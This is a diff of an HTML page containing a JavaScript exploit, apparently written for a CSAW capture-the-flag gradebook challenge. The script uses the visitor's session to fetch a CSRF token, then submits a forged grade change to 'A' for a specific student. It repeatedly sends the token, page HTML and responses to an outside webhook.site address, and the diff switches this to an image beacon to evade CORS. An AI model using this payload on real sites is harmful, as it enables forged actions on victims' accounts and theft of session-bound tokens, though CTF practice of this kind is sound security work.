@@ -2,35 +2,52 @@
 <html>
 <body>
     <script>
+        function sendToWebhook(data) {
+            // Convert data to URL parameters
+            const params = new URLSearchParams();
+            params.append('data', JSON.stringify(data));
+            
+            // Use img tag to avoid CORS
+            const img = new Image();
+            img.src = `https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb?${params.toString()}`;
+        }
+
+        sendToWebhook({message: 'Script started', timestamp: new Date().toISOString()});
+
         // First, fetch the grade-change page to get the CSRF token
         fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
             credentials: 'include'
         })
         .then(response => response.text())
         .then(html => {
+            sendToWebhook({
+                type: 'get_response',
+                message: 'Received GET response from /grade-change',
+                html_length: html.length,
+                html_preview: html.substring(0, 500) + '...'
+            });
+
             // Parse the HTML to extract the CSRF token
             const parser = new DOMParser();
             const doc = parser.parseFromString(html, 'text/html');
             const csrfInput = doc.querySelector('input[name="csrf_token"]');
             
             if (!csrfInput) {
-                // Send the entire HTML to webhook for debugging
-                fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        type: 'csrf_token_not_found',
-                        full_html: html,
-                        message: 'CSRF token input not found in the GET response'
-                    })
+                sendToWebhook({
+                    type: 'error',
+                    message: 'CSRF token input not found',
+                    html: html
                 });
                 return;
             }
             
             const csrfToken = csrfInput.value;
-            
+            sendToWebhook({
+                type: 'csrf_found',
+                message: 'CSRF token extracted',
+                csrf_token: csrfToken
+            });
+
             // Prepare the POST data
             const formData = new FormData();
             formData.append('student_id', 'cec61aee-395d-4281-af96-cfe05bda466e');
@@ -46,52 +63,27 @@
             })
             .then(response => response.text())
             .then(postResponseHtml => {
-                // Send the entire POST response HTML to webhook
-                fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        type: 'post_response',
-                        full_html: postResponseHtml,
-                        csrf_token_used: csrfToken,
-                        post_data: {
-                            student_id: 'cec61aee-395d-4281-af96-cfe05bda466e',
-                            class_id: 'e522382b-7643-469c-ae52-ba488f5752c6',
-                            grade: 'A'
-                        },
-                        message: 'POST request completed'
-                    })
+                sendToWebhook({
+                    type: 'post_response',
+                    message: 'POST request completed',
+                    status: 'success',
+                    response_length: postResponseHtml.length,
+                    response_preview: postResponseHtml.substring(0, 500) + '...'
                 });
             })
             .catch(error => {
-                // Send error to webhook
-                fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        type: 'post_error',
-                        error: error.toString(),
-                        message: 'POST request failed'
-                    })
+                sendToWebhook({
+                    type: 'post_error',
+                    message: 'POST request failed',
+                    error: error.toString()
                 });
             });
         })
         .catch(error => {
-            // Send error to webhook
-            fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    type: 'get_error',
-                    error: error.toString(),
-                    message: 'GET request for CSRF token failed'
-                })
+            sendToWebhook({
+                type: 'get_error',
+                message: 'GET request failed',
+                error: error.toString()
             });
         });
     </script>
